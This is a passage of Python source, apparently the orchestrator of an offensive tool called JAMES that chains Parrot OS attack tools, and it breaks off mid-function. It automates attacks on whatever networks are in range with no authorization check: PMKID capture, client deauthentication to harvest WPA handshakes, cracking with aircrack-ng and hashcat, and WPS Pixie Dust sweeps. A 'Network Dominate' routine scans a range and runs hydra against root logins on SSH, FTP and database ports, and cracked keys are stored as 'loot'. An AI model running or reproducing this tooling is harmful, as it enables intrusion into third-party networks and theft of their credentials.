"""
JAMES Orchestrator.

Central coordinator that connects tool wrappers, the execution layer,
skill definitions, and the GUI. Maintains a task log and emits
signals the GUI can subscribe to.
"""

import glob
import json
import logging
import os
import re
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

from james.layers.native import NativeLayer
from james.tools.parrot import (
    Nmap, AircrackSuite, Hashcat, John,
    Masscan, Responder, TheHarvester, SSLScan, WafDetector, Ettercap,
    Reaver, Hcxtools,
)

logger = logging.getLogger(__name__)

SKILLS_DIR = Path(__file__).resolve().parent.parent / "skills"


class TaskEntry:
    """Single entry in the task log."""

    def __init__(self, action: str, tool: str, params: dict):
        self.timestamp = datetime.now().isoformat()
        self.action = action
        self.tool = tool
        self.params = params
        self.result: Optional[dict] = None
        self.status = "pending"  # pending | running | done | error

    def as_dict(self) -> dict:
        return {
            "timestamp": self.timestamp,
            "action": self.action,
            "tool": self.tool,
            "params": self.params,
            "result": self.result,
            "status": self.status,
        }

# Pre-compiled regex for skill template variable substitution
_TEMPLATE_VAR_RE = re.compile(r"\{\{(\w+)\}\}")


class Orchestrator:
    """
    Top-level coordinator for JAMES.

    Attributes:
        layer:    NativeLayer instance
        nmap:     Nmap wrapper
        aircrack: AircrackSuite wrapper
        hashcat:  Hashcat wrapper
        john:     John wrapper
        task_log: ordered list of TaskEntry objects (capped at MAX_LOG)
    """

    MAX_LOG = 500  # prevent unbounded memory growth

    # Common wordlist paths for auto-detection
    _WORDLISTS = [
        "/home/malcolm/Desktop/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou.txt.gz",
        "/home/malcolm/Desktop/wordlists/rockyou.txt",
    ]

    LOOT_DIR = Path.home() / ".james" / "loot"

    def __init__(self):
        self.layer = NativeLayer()
        self.nmap = Nmap(self.layer)
        self.aircrack = AircrackSuite(self.layer)
        self.hashcat = Hashcat(self.layer)
        self.john = John(self.layer)
        self.masscan = Masscan(self.layer)
        self.responder = Responder(self.layer)
        self.harvester = TheHarvester(self.layer)
        self.sslscan = SSLScan(self.layer)
        self.wafdetect = WafDetector(self.layer)
        self.ettercap = Ettercap(self.layer)
        self.reaver = Reaver(self.layer)
        self.hcxtools = Hcxtools(self.layer)
        self.task_log: list[TaskEntry] = []

        # callbacks the GUI can set to receive updates
        self.on_task_update: Optional[callable] = None
        self.on_print: Optional[callable] = None
        # progress callback: (phase_name: str, phase_num: int, total_phases: int)
        self.on_progress: Optional[callable] = None

        # Result cache — persists cracked keys, scan summaries across sessions
        self.loot_cache: dict = self._load_loot()

        # Tool name → object lookup for skill execution (built once)
        self._tool_map: Optional[dict] = None

        # Skill list cache — avoids re-globbing 37 JSON files on every call
        self._skill_cache: Optional[list[str]] = None

    # ── loot persistence ────────────────────────────────────────

    def _load_loot(self) -> dict:
        """Load cached loot (cracked keys, etc.) from disk."""
        loot_file = self.LOOT_DIR / "results.json"
        if loot_file.exists():
            try:
                with open(loot_file, "r") as f:
                    return json.load(f)
            except (json.JSONDecodeError, IOError):
                pass
        return {"cracked_keys": {}, "scan_history": [], "captured_hashes": []}

    def _save_loot(self):
        """Persist loot cache to disk."""
        self.LOOT_DIR.mkdir(parents=True, exist_ok=True)
        loot_file = self.LOOT_DIR / "results.json"
        try:
            with open(loot_file, "w") as f:
                json.dump(self.loot_cache, f, indent=2, default=str)
        except IOError as e:
            logger.warning("Failed to save loot: %s", e)

    def cache_cracked_key(self, bssid_or_id: str, key: str, method: str = "unknown", essid: str = ""):
        """Store a cracked credential in the persistent loot cache."""
        self.loot_cache["cracked_keys"][bssid_or_id] = {
            "key": key, "method": method, "essid": essid,
            "cracked_at": datetime.now().isoformat(),
        }
        self._save_loot()
        self._print(f"[LOOT] Cached key for {essid or bssid_or_id}: {key}")

    def get_cached_key(self, bssid_or_id: str) -> Optional[str]:
        """Check if we already cracked this target."""
        entry = self.loot_cache.get("cracked_keys", {}).get(bssid_or_id)
        return entry["key"] if entry else None

    def get_loot_summary(self) -> dict:
        """Return summary of all cached loot."""
        keys = self.loot_cache.get("cracked_keys", {})
        return {
            "cracked_count": len(keys),
            "keys": [
                {"id": k, "essid": v.get("essid", ""), "method": v.get("method", ""),
                 "key": v["key"], "when": v.get("cracked_at", "")}
                for k, v in keys.items()
            ],
        }

    # ── auto wordlist detection ─────────────────────────────────

    def find_wordlist(self) -> Optional[str]:
        """Auto-detect the best available wordlist on the system."""
        for wl in self._WORDLISTS:
            if Path(wl).exists():
                return wl
        # Fallback: search common directories
        result = self.layer.run(
            "find /usr/share/wordlists -name 'rockyou*' -type f 2>/dev/null | head -1",
            timeout=5
        )
        if result.stdout.strip():
            return result.stdout.strip()
        return None

    def _print(self, msg: str):
        logger.info(msg)
        if self.on_print:
            self.on_print(msg)

    def _emit_progress(self, phase: str, num: int, total: int):
        """Emit progress update if a listener is attached."""
        if self.on_progress:
            try:
                self.on_progress(phase, num, total)
            except Exception:
                pass
    # ── monitor interface helper ─────────────────────────────────

    def _mon_iface(self, interface: str) -> str:
        """Derive the monitor-mode interface name from a managed interface.
        
        If the interface already ends with 'mon', returns it as-is.
        Otherwise returns '<interface>mon' (the airmon-ng default).
        """
        if interface.endswith("mon"):
            return interface
        return f"{interface}mon"

    # ── convenience actions ─────────────────────────────────────

    def system_check(self) -> dict:
        """Verify that required tools are installed (batched for speed)."""
        tools = [
            "nmap", "masscan", "aircrack-ng", "airmon-ng", "airodump-ng",
            "aireplay-ng", "hashcat", "john", "iwconfig",
            "hydra", "medusa", "ncrack", "sqlmap", "nikto",
            "gobuster", "whatweb", "wafw00f", "sslscan",
            "theHarvester", "responder", "ettercap",
            "msfconsole", "netcat", "socat", "tcpdump", "tshark",
            "reaver", "bully", "mdk4", "wifite", "hcxdumptool",
            "enum4linux", "smbclient", "arp-scan", "netdiscover",
            "hostapd", "dnsmasq", "hcxpcapngtool",
        ]
        # Single shell command: print each tool that IS found
        check_cmds = " ".join(f"which {t} 2>/dev/null && echo FOUND:{t};" for t in tools)
        result = self.layer.run(check_cmds, timeout=15)
        found = set()
        for line in result.stdout.splitlines():
            if line.startswith("FOUND:"):
                found.add(line[6:])
        return {t: (t in found) for t in tools}

    # ── kill JAMES ──────────────────────────────────────────────

    def kill_james(self) -> dict:
        """
        Emergency stop — kill every tool JAMES may have spawned,
        restore all wireless interfaces to managed mode, flush
        iptables, restart NetworkManager, and clean temp files.
        Returns a summary dict of what was cleaned up.
        """
        summary = {"killed": [], "interfaces_restored": [], "errors": []}

        self._print("━" * 50)
        self._print("🛑 KILL JAMES — Shutting everything down...")
        self._print("━" * 50)
        self._emit_progress("Killing processes", 1, 5)

        # ── 1. Kill all known pentesting processes ──────────────
        kill_targets = [
            "airodump-ng", "aireplay-ng", "airmon-ng", "aircrack-ng",
            "hcxdumptool", "hashcat", "john", "nmap", "masscan",
            "reaver", "bully", "mdk4", "wifite",
            "responder", "ettercap", "hostapd", "dnsmasq",
            "hydra", "medusa", "ncrack",
            "sqlmap", "nikto", "gobuster", "whatweb",
            "tcpdump", "tshark",
        ]

        self._print("\n[KILL] Phase 1/5 — Killing tool processes...")
        # First kill all tracked background processes from the registry
        registry_killed = self.layer.kill_all_background()
        if registry_killed:
            self._print(f"  ✕ Killed {registry_killed} tracked background process(es)")
            summary["killed"].append(f"{registry_killed} tracked processes")

        # Then broadcast-kill any strays not in the registry
        pkill_cmd = "; ".join(f"pkill -f {p} 2>/dev/null && echo KILLED:{p}" for p in kill_targets)
        killall_cmd = "; ".join(f"killall {p} 2>/dev/null" for p in kill_targets)
        result = self.layer.run(pkill_cmd, sudo=True, timeout=10)
        self.layer.run(killall_cmd, sudo=True, timeout=10)

        for line in result.stdout.splitlines():
            if line.startswith("KILLED:"):
                name = line[7:]
                summary["killed"].append(name)
                self._print(f"  ✕ Killed: {name}")

        # Small delay for processes to die
        time.sleep(1)

        # ── 2. Restore all wireless interfaces to managed mode ──
        self._print("\n[KILL] Phase 2/5 — Restoring wireless interfaces...")
        self._emit_progress("Restoring interfaces", 2, 5)
        try:
            ifaces = self.aircrack.list_interfaces()
            for iface in ifaces:
                name = iface["interface"]
                mode = iface.get("mode", "").lower()
                if mode == "monitor" or name.endswith("mon"):
                    self._print(f"  ↩ Restoring {name} to managed mode...")
                    self.layer.run(f"airmon-ng stop {name}", sudo=True, timeout=10)
                    summary["interfaces_restored"].append(name)

            # Also brute-force stop any common monitor interfaces (batched)
            self.layer.run(
                "airmon-ng stop wlan0mon 2>/dev/null; "
                "airmon-ng stop wlan1mon 2>/dev/null; "
                "airmon-ng stop mon0 2>/dev/null; "
                "airmon-ng stop mon1 2>/dev/null",
                sudo=True, timeout=15,
            )

            # Set interfaces back to up + managed via iw/ifconfig
            ifaces_after = self.aircrack.list_interfaces()
            for iface in ifaces_after:
                name = iface["interface"]
                self.layer.run(
                    f"ifconfig {name} down 2>/dev/null && "
                    f"iwconfig {name} mode managed 2>/dev/null && "
                    f"ifconfig {name} up 2>/dev/null",
                    sudo=True, timeout=8,
                )
                self._print(f"  ✓ {name} → managed mode, UP")
        except Exception as e:
            summary["errors"].append(f"Interface restore: {e}")
            self._print(f"  [!] Interface restore error: {e}")

        # ── 3. Flush iptables rules (evil twin / MITM cleanup) ──
        self._print("\n[KILL] Phase 3/5 — Flushing iptables & routing...")
        self._emit_progress("Flushing iptables", 3, 5)
        self.layer.run(
            "iptables --flush && iptables --table nat --flush && "
            "iptables --table mangle --flush && iptables -P FORWARD DROP && "
            "echo 0 > /proc/sys/net/ipv4/ip_forward",
            sudo=True, timeout=10,
        )
        self._print("  ✓ iptables flushed, IP forwarding disabled")

        # ── 4. Restart NetworkManager to reconnect Wi-Fi ────────
        self._print("\n[KILL] Phase 4/5 — Restarting NetworkManager...")
        self._emit_progress("Restarting NetworkManager", 4, 5)
        nm_result = self.layer.run("systemctl restart NetworkManager", sudo=True, timeout=15)
        if nm_result.success:
            self._print("  ✓ NetworkManager restarted — Wi-Fi should reconnect shortly")
        else:
            # Fallback: try service command
            self.layer.run("service network-manager restart 2>/dev/null", sudo=True, timeout=10)
            self._print("  ↻ Attempted NetworkManager restart via service command")

        # Also try wpa_supplicant restart
        self.layer.run("systemctl restart wpa_supplicant 2>/dev/null", sudo=True, timeout=10)

        # ── 5. Clean up temp files ──────────────────────────────
        self._print("\n[KILL] Phase 5/5 — Cleaning temp files...")
        self._emit_progress("Cleaning temp files", 5, 5)
        self.layer.run("rm -f /tmp/james_* 2>/dev/null", timeout=5)
        self._print("  ✓ Temp files cleaned")

        # ── Summary ─────────────────────────────────────────────
        self._print("\n" + "━" * 50)
        self._print(f"🛑 KILL JAMES Complete")
        self._print(f"  Processes killed:     {len(summary['killed'])}")
        self._print(f"  Interfaces restored:  {len(summary['interfaces_restored'])}")
        if summary["errors"]:
            self._print(f"  Errors:               {len(summary['errors'])}")

        # Verify connectivity
        self._print("\n  ⏳ Checking internet connectivity...")
        time.sleep(5)
        ping = self.layer.run("ping -c 1 -W 3 8.8.8.8", timeout=8)
        if ping.success:
            self._print("  ✓ Internet connectivity verified")
            summary["connectivity"] = True
        else:
            self._print("  ⚠ No internet yet — Wi-Fi may take 10-20s to reconnect")
            self._print("  If stuck, manually reconnect from the network tray.")
            summary["connectivity"] = False

        self._print("━" * 50)

        return summary

    # ── live AP scanner ─────────────────────────────────────────

    def scan_nearby_aps(self, interface: str, duration: int = 10) -> dict:
        """
        Quick scan for nearby Wi-Fi access points.
        Returns structured AP list sorted by signal strength.
        Auto-enables monitor mode if not already active.
        """
        entry = self._log("ap_scan", "airodump-ng", {"interface": interface})

        # Determine / prepare the monitor-mode interface
        if interface.endswith("mon"):
            mon_iface = interface
        else:
            # Ensure interfering processes are killed and monitor mode is on
            self._print(f"[AP SCAN] Enabling monitor mode on {interface}...")
            self.aircrack.check_kill()
            mon_result = self.aircrack.enable_monitor(interface)

            # airmon-ng may create <iface>mon, mon0, etc. — detect the name
            mon_iface = f"{interface}mon"
            ifaces_after = self.aircrack.list_interfaces()
            for ifc in ifaces_after:
                if ifc.get("mode", "").lower() == "monitor":
                    mon_iface = ifc["interface"]
                    break
            self._print(f"[AP SCAN] Using monitor interface: {mon_iface}")

        prefix = "/tmp/james_apscan"
        self.layer.run(f"rm -f {prefix}*")
        proc = self.aircrack.start_airodump(
            mon_iface, write_prefix=prefix,
        )
        time.sleep(duration)
        self.layer.kill_background(proc)

        # Find the CSV file — airodump may name it -01.csv, -02.csv, etc.
        csv_files = sorted(glob.glob(f"{prefix}*.csv"))
        aps = []
        if csv_files:
            try:
                with open(csv_files[0], "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
                    if content.strip():
                        parsed = self.aircrack.parse_airodump_csv(content)
                        aps = parsed.get("aps", [])
                        # Filter out invalid entries (blank BSSIDs, power == -1)
                        aps = [ap for ap in aps if ap.get("bssid", "").count(":") == 5 and ap.get("power", -1) != -1]
                        aps.sort(key=lambda x: x.get("power", -100), reverse=True)
            except Exception as e:
                self._print(f"[AP SCAN] Failed to parse CSV: {e}")
                logger.exception("Failed to parse airodump CSV file: %s", csv_files[0])
        else:
            self._print("[AP SCAN] No CSV output from airodump-ng — check that the interface supports monitor mode and is not blocked.")
            logger.error("No airodump-ng CSV files found matching %s*.csv", prefix)

        # Restore managed mode if we enabled monitor ourselves
        if not interface.endswith("mon"):
            self.aircrack.disable_monitor(mon_iface)

        result = {"aps": aps, "count": len(aps), "duration": duration}
        self._finish(entry, result)
        return result

    def connect_open_wifi(self) -> dict:
        """Scan and connect to the strongest open Wi-Fi network."""
        entry = self._log("connect_open", "nmcli", {})
        self._print("━" * 50)
        self._print("🌐 Connecting to Open Wi-Fi")
        self._print("━" * 50)
        
        self._print("[WIFI] Rescanning for nearby networks...")
        self.layer.run("nmcli dev wifi rescan", timeout=10)
        time.sleep(3)
        
        result = self.layer.run("nmcli -t -e no -f BSSID,SSID,SECURITY,SIGNAL dev wifi list", timeout=10)
        open_aps = []
        for line in result.stdout.splitlines():
            line = line.strip()
            if not line or len(line) < 18: continue
            
            bssid = line[:17]
            rest = line[18:]
            parts = rest.rsplit(":", 2)
            if len(parts) != 3: continue
            
            ssid, security, signal_str = parts
            if not security.strip() or security.strip() == "--":
                try:
                    open_aps.append((bssid, ssid, int(signal_str)))
                except ValueError:
                    pass
        
        if not open_aps:
            msg = "[WIFI] No open Wi-Fi networks found nearby."
            self._print(msg)
            res = {"success": False, "error": "No open networks found"}
            self._finish(entry, res)
            return res
            
        open_aps.sort(key=lambda x: x[2], reverse=True)
        best_bssid, best_ssid, best_sig = open_aps[0]
        
        self._print(f"[WIFI] Found open network '{best_ssid}' ({best_bssid}) at {best_sig}% signal.")
        self._print(f"[WIFI] Attempting connection to {best_bssid}...")
        
        conn = self.layer.run(f"nmcli dev wifi connect '{best_bssid}'", sudo=True, timeout=30)
        if conn.success or "successfully activated" in conn.stdout:
            msg = f"✅ Connected to open Wi-Fi: {best_ssid}"
            self._print(msg)
            res = {"success": True, "bssid": best_bssid, "ssid": best_ssid, "message": msg}
        else:
            msg = f"❌ Failed to connect to {best_ssid}: {conn.stderr.strip() or conn.stdout.strip()}"
            self._print(msg)
            res = {"success": False, "error": msg, "bssid": best_bssid, "ssid": best_ssid}
            
        self._finish(entry, res)
        return res

    def quick_recon(self, target: str) -> dict:
        """Run a fast nmap scan and log it."""
        entry = self._log("quick_recon", "nmap", {"target": target})
        result = self.nmap.quick_scan(target)
        self._finish(entry, result)
        return result

    def full_scan(self, target: str, ports: str = "1-65535") -> dict:
        entry = self._log("full_scan", "nmap", {"target": target, "ports": ports})
        result = self.nmap.scan(target, ports=ports, flags="-sV -sC", sudo=True, timeout=600)
        self._finish(entry, result)
        return result

    def wifi_interfaces(self) -> list[dict]:
        entry = self._log("wifi_interfaces", "aircrack", {})
        ifaces = self.aircrack.list_interfaces()
        self._finish(entry, {"interfaces": ifaces})
        return ifaces

    def start_monitor(self, interface: str) -> dict:
        entry = self._log("start_monitor", "aircrack", {"interface": interface})
        self.aircrack.check_kill()
        result = self.aircrack.enable_monitor(interface)
        self._finish(entry, result.as_dict())
        return result.as_dict()

    def stop_monitor(self, interface: str) -> dict:
        entry = self._log("stop_monitor", "aircrack", {"interface": interface})
        result = self.aircrack.disable_monitor(interface)
        self._finish(entry, result.as_dict())
        return result.as_dict()

    def crack_handshake(self, capture: str, wordlist: str, bssid: str = None) -> dict:
        entry = self._log("crack_handshake", "aircrack",
                          {"capture": capture, "wordlist": wordlist, "bssid": bssid})
        result = self.aircrack.crack_wpa(capture, wordlist, bssid=bssid)
        self._finish(entry, result)
        return result

    def crack_hash(self, hash_file: str, wordlist: str, mode: int = 0) -> dict:
        entry = self._log("crack_hash", "hashcat",
                          {"hash_file": hash_file, "wordlist": wordlist, "mode": mode})
        result = self.hashcat.crack(hash_file, wordlist, hash_mode=mode)
        self._finish(entry, result)
        return result

    # ── wifi: PMKID ─────────────────────────────────────────────

    def pmkid_attack(self, interface: str, wordlist: str, *, target_bssid: str = None, capture_time: int = 60) -> dict:
        """
        Autonomous PMKID attack: capture PMKID hash via hcxdumptool,
        convert to hashcat format, and crack.
        """
        self._print("[PMKID] Starting clientless PMKID attack...")

        # 1. Prep
        self.aircrack.check_kill()
        mon_iface = self._mon_iface(interface)
        self.start_monitor(interface)

        # 2. Capture
        pcapng = "/tmp/james_pmkid.pcapng"
        self.layer.run(f"rm -f {pcapng}")

        filter_arg = ""
        if target_bssid:
            filter_arg = f" --filterlist_ap={target_bssid} --filtermode=2"
            self._print(f"[PMKID] Targeting BSSID: {target_bssid}")
        else:
            self._print("[PMKID] No target specified — capturing all nearby PMKIDs")

        entry = self._log("pmkid_capture", "hcxtools", {"interface": mon_iface, "time": capture_time})
        result = self.hcxtools.capture_pmkid(mon_iface, pcapng, timeout=capture_time)
        self._finish(entry, result)

        # 3. Convert
        hash_file = "/tmp/james_pmkid_hash.22000"
        self.layer.run(f"rm -f {hash_file}")

        entry = self._log("pmkid_extract", "hcxtools", {"pcapng": pcapng})
        extract = self.hcxtools.extract_hashes(pcapng, hash_file)
        self._finish(entry, extract)

        self.stop_monitor(mon_iface)

        if not extract.get("success"):
            self._print("[PMKID] No PMKID or EAPOL hashes captured.")
            return {"success": False, "error": "No hashes captured. Try longer capture time or get closer."}

        self._print(f"[PMKID] Extracted {extract['pmkid_count']} PMKID(s), {extract['eapol_count']} EAPOL pair(s)")

        # 4. Crack
        self._print(f"[PMKID] Cracking with hashcat (mode 22000) using {wordlist}...")
        entry = self._log("pmkid_crack", "hashcat", {"hash_file": hash_file, "wordlist": wordlist})
        crack_result = self.hashcat.crack(hash_file, wordlist, hash_mode=22000, timeout=1800)
        self._finish(entry, crack_result)

        # 5. Check results
        cracked_file = "/tmp/james_pmkid_cracked.txt"
        show = self.layer.run(f"cat {cracked_file} 2>/dev/null", timeout=5)

        if show.success and show.stdout.strip():
            self._print(f"[PMKID] SUCCESS! Cracked: {show.stdout.strip()}")
            return {"success": True, "cracked": show.stdout.strip()}
        else:
            self._print("[PMKID] Cracking complete — key not in wordlist.")
            return {"success": False, "error": "Key not in wordlist.", "hash_file": hash_file}

    # ── wifi: WPS ───────────────────────────────────────────────

    def wps_pixie_attack(self, interface: str, bssid: str, channel: int) -> dict:
        """
        Run a WPS Pixie Dust attack against a target AP.
        """
        self._print(f"[WPS] Pixie Dust attack on {bssid} (ch {channel})...")

        self.aircrack.check_kill()
        mon_iface = self._mon_iface(interface)
        self.start_monitor(interface)

        entry = self._log("wps_pixie_dust", "reaver", {"bssid": bssid, "channel": channel})
        result = self.reaver.pixie_dust(mon_iface, bssid, channel=channel)
        self._finish(entry, result)

        self.stop_monitor(mon_iface)

        if result["success"]:
            self._print(f"[WPS] SUCCESS! PIN: {result['pin']}  PSK: {result['wpa_psk']}")
        else:
            self._print("[WPS] Pixie Dust failed — AP may not be vulnerable.")

        return result

    def wps_scan(self, interface: str) -> dict:
        """
        Scan for WPS-enabled APs using wash.
        Returns a list of discovered WPS-enabled access points.
        """
        self._print("[WPS] Scanning for WPS-enabled access points...")
        mon_iface = self._mon_iface(interface)

        entry = self._log("wps_scan", "wash", {"interface": mon_iface})
        result = self.layer.run(
            f"timeout 20 wash -i {mon_iface} -s 2>/dev/null",
            sudo=True, timeout=30
        )

        aps = []
        for line in result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 6 and ":" in parts[0]:
                aps.append({
                    "bssid": parts[0],
                    "channel": parts[1],
                    "rssi": parts[2],
                    "wps_version": parts[3],
                    "wps_locked": parts[4],
                    "essid": " ".join(parts[5:]),
                })

        self._finish(entry, {"aps": aps, "count": len(aps)})
        self._print(f"[WPS] Found {len(aps)} WPS-enabled AP(s)")
        return {"aps": aps, "count": len(aps)}

    # ── ONE-CLICK HACKS ────────────────────────────────────────

    def oneclick_wifi_blitz(self, interface: str, wordlist: str = "/home/malcolm/Desktop/rockyou.txt") -> dict:
        """
        ONE-CLICK: Wi-Fi Blitz — Multi-vector Wi-Fi attack.
        Tries PMKID first (clientless), falls back to handshake capture,
        then attempts WPS Pixie Dust on any WPS-enabled targets.
        """
        results = {"pmkid": None, "handshake": None, "wps": None, "cracked": []}
        self._print("━" * 50)
        self._print("🔥 ONE-CLICK: Wi-Fi Blitz — Multi-Vector Attack")
        self._print("━" * 50)

        # Phase 1: PMKID (clientless — no deauth needed)
        self._print("\n[PHASE 1/3] PMKID Capture (clientless)")
        self.aircrack.check_kill()
        mon_iface = self._mon_iface(interface)
        self.start_monitor(interface)

        pcapng = "/tmp/james_blitz_pmkid.pcapng"
        self.layer.run(f"rm -f {pcapng}")
        pmkid_result = self.hcxtools.capture_pmkid(mon_iface, pcapng, timeout=30)
        results["pmkid"] = pmkid_result

        hash_file = "/tmp/james_blitz_pmkid.22000"
        extract = self.hcxtools.extract_hashes(pcapng, hash_file)
        if extract.get("success"):
            self._print(f"[PMKID] Captured {extract['pmkid_count']} PMKID(s)! Cracking...")
            crack = self.hashcat.crack(hash_file, wordlist, hash_mode=22000, timeout=300)
            if crack.get("success"):
                results["cracked"].append({"method": "PMKID", "result": crack})

        # Phase 2: Traditional Handshake Harvest (top 3 strongest APs)
        self._print("\n[PHASE 2/3] Handshake Harvest (deauth + capture)")
        recon_prefix = "/tmp/james_blitz_recon"
        self.layer.run(f"rm -f {recon_prefix}*")
        proc = self.aircrack.start_airodump(mon_iface, write_prefix=recon_prefix)
        time.sleep(15)
        self.layer.kill_background(proc)

        csv_files = sorted(glob.glob(f"{recon_prefix}*.csv"))
        if csv_files:
            with open(csv_files[0], "r", encoding="utf-8", errors="ignore") as f:
                parsed = self.aircrack.parse_airodump_csv(f.read())

            wpa_aps = [ap for ap in parsed["aps"] if "WPA" in ap.get("privacy", "")]
            wpa_aps.sort(key=lambda x: x["power"], reverse=True)

            # Build station→bssid map for targeted deauth
            station_map = {}
            for st in parsed.get("stations", []):
                bssid = st.get("bssid", "")
                if bssid:
                    station_map.setdefault(bssid, []).append(st["station_mac"])

            for i, target in enumerate(wpa_aps[:3]):
                # Skip already-cracked targets
                cached = self.get_cached_key(target["bssid"])
                if cached:
                    self._print(f"  ⏭ {target['essid']} already cracked (loot cache): {cached}")
                    continue

                self._print(f"  → Target {i+1}: {target['bssid']} ({target['essid']}) ch{target['channel']}")
                cap_prefix = f"/tmp/james_blitz_cap_{i}"
                self.layer.run(f"rm -f {cap_prefix}*")
                cap_proc = self.aircrack.start_airodump(
                    mon_iface, channel=target["channel"],
                    bssid=target["bssid"], write_prefix=cap_prefix
                )

                # Multi-attempt deauth with client-targeted approach
                cap_file = f"{cap_prefix}-01.cap"
                handshake_ok = False
                clients = station_map.get(target["bssid"], [])

                for attempt in range(3):
                    time.sleep(3)
                    if clients:
                        # Targeted deauth — much higher success rate
                        for client_mac in clients[:2]:
                            self.aircrack.deauth(
                                mon_iface, target["bssid"],
                                count=5, client=client_mac,
                            )
                            self._print(f"    deauth → client {client_mac} (attempt {attempt+1}/3)")
                    else:
                        # Broadcast deauth fallback
                        self.aircrack.deauth(mon_iface, target["bssid"], count=10)
                        self._print(f"    deauth → broadcast (attempt {attempt+1}/3)")

                    time.sleep(8)
                    if Path(cap_file).exists() and self.aircrack.check_handshake(cap_file, target["bssid"]):
                        handshake_ok = True
                        break

                self.layer.kill_background(cap_proc)

                if not handshake_ok:
                    self._print(f"  ✕ No handshake for {target['essid']}")
                    continue

                self._print(f"  ✓ Handshake captured for {target['essid']}! Cracking...")

                # Try aircrack-ng first (CPU)
                crack = self.aircrack.crack_wpa(cap_file, wordlist, bssid=target["bssid"])
                if crack.get("found"):
                    self._print(f"  🔑 CRACKED (aircrack): {target['essid']} → {crack['key']}")
                    self.cache_cracked_key(target["bssid"], crack["key"], method="handshake", essid=target["essid"])
                    results["cracked"].append({
                        "method": "handshake", "essid": target["essid"],
                        "bssid": target["bssid"], "key": crack["key"]
                    })
                    continue

                # Hashcat GPU fallback — convert cap → hc22000 and crack
                hc_file = f"{cap_prefix}.hc22000"
                conv = self.hcxtools.extract_hashes(cap_file, hc_file)
                if conv.get("success"):
                    self._print(f"  ↻ aircrack failed, trying hashcat (GPU)...")
                    hc_crack = self.hashcat.crack(hc_file, wordlist, hash_mode=22000, timeout=300)
                    # Check hashcat output for cracked keys
                    if hc_crack.get("success") and ":" in hc_crack.get("output", ""):
                        # Extract key from hashcat output (last field after :)
                        for line in hc_crack["output"].splitlines():
                            if ":" in line and not line.startswith("["):
                                key = line.rsplit(":", 1)[-1].strip()
                                if key:
                                    self._print(f"  🔑 CRACKED (hashcat): {target['essid']} → {key}")
                                    self.cache_cracked_key(target["bssid"], key, method="handshake+hashcat", essid=target["essid"])
                                    results["cracked"].append({
                                        "method": "handshake+hashcat", "essid": target["essid"],
                                        "bssid": target["bssid"], "key": key
                                    })
                                    break

        # Phase 3: WPS Pixie Dust on any WPS targets
        self._print("\n[PHASE 3/3] WPS Pixie Dust Sweep")
        wash_result = self.layer.run(f"timeout 15 wash -i {mon_iface} -s 2>/dev/null", sudo=True, timeout=20)
        wps_targets = []
        for line in wash_result.stdout.splitlines():
            parts = line.split()
            if len(parts) >= 6 and ":" in parts[0] and parts[4] != "Yes":
                wps_targets.append({"bssid": parts[0], "channel": parts[1], "essid": " ".join(parts[5:])})

        for wps_t in wps_targets[:3]:
            self._print(f"  → WPS target: {wps_t['bssid']} ({wps_t['essid']})")
            try:
                ch = int(wps_t["channel"])
            except (ValueError, TypeError):
                continue
            pixie = self.reaver.pixie_dust(mon_iface, wps_t["bssid"], channel=ch, timeout=60)
            if pixie.get("success"):
                self._print(f"  🔑 WPS CRACKED: {wps_t['essid']} → PIN:{pixie['pin']} PSK:{pixie['wpa_psk']}")
                results["cracked"].append({
                    "method": "wps_pixie", "essid": wps_t["essid"],
                    "pin": pixie["pin"], "wpa_psk": pixie["wpa_psk"]
                })

        # Cleanup
        self.stop_monitor(mon_iface)

        # Summary
        self._print("\n" + "━" * 50)
        self._print(f"🏁 Wi-Fi Blitz Complete — {len(results['cracked'])} network(s) cracked!")
        for c in results["cracked"]:
            self._print(f"  🔑 {c.get('essid', 'unknown')} via {c['method']}: {c.get('key', c.get('wpa_psk', ''))}")
        self._print("━" * 50)

        return results

    def oneclick_network_dominate(self, target_range: str) -> dict:
        """
        ONE-CLICK: Network Dominate — Full network takeover chain.
        Discovery → Port scan → Service fingerprint → Brute-force → Exploit suggestions.
        """
        self._print("━" * 50)
        self._print("💀 ONE-CLICK: Network Dominate")
        self._print("━" * 50)

        results = {"hosts": [], "services": [], "brute_results": [], "vulns": []}

        # Phase 1: Discovery
        self._print("\n[PHASE 1/4] Network Discovery (masscan)")
        entry = self._log("netdom_discovery", "masscan", {"target": target_range})
        mass_result = self.masscan.scan(target_range, ports="21,22,23,25,53,80,110,139,143,443,445,993,995,3306,3389,5432,8080,8443", rate=500, timeout=120)
        self._finish(entry, mass_result)

        live_ips = list(set(h["ip"] for h in mass_result.get("hosts", [])))
        self._print(f"  Found {len(live_ips)} live host(s)")

        # Phase 2: Deep scan each host
        self._print("\n[PHASE 2/4] Service Fingerprinting (nmap)")
        for ip in live_ips[:10]:
            entry = self._log("netdom_fingerprint", "nmap", {"target": ip})
            scan = self.nmap.scan(ip, flags="-sV -sC --script=vuln", sudo=True, timeout=180)
            self._finish(entry, scan)

            for host in scan.get("hosts", []):
                for port in host.get("ports", []):
                    svc = {"ip": ip, "port": port["port"], "service": port["service"], "version": port.get("version", "")}
                    results["services"].append(svc)
                    self._print(f"  {ip}:{port['port']} → {port['service']} {port.get('version', '')}")

        # Phase 3: Auto brute-force common services
        self._print("\n[PHASE 3/4] Auto Brute-Force")
        wordlist = "/home/malcolm/Desktop/rockyou.txt"
        brute_services = {"ssh": 22, "ftp": 21, "mysql": 3306, "postgres": 5432}

        for svc in results["services"]:
            proto = None
            for name, port in brute_services.items():
                if svc["port"] == port or name in svc["service"]:
                    proto = name
                    break
            if proto:
                self._print(f"  → Bruting {svc['ip']}:{svc['port']} ({proto})")
                brute = self.layer.run(
                    f"hydra -l root -P {wordlist} {svc['ip']} {proto} -t 4 -f -w 10",
                    timeout=120
                )
                if "login:" in brute.stdout:
                    self._print(f"  🔑 FOUND: {brute.stdout.strip()}")
                    results["brute_results"].append({"ip": svc["ip"], "proto": proto, "output": brute.stdout})

        # Phase 4: Vuln summary
        self._print("\n[PHASE 4/4] Vulnerability Summary")
        for svc in results["services"]:
            if svc["port"] == 445:
                results["vulns"].append(f"SMB on {svc['ip']} — check for EternalBlue (ms17-010)")
            if svc["port"] == 80 or svc["port"] == 443:
                results["vulns"].append(f"Web server on {svc['ip']}:{svc['port']} — run full_web_audit")
            if svc["port"] == 3389:
                results["vulns"].append(f"RDP on {svc['ip']} — check for BlueKeep (CVE-2019-0708)")

        for v in results["vulns"]:
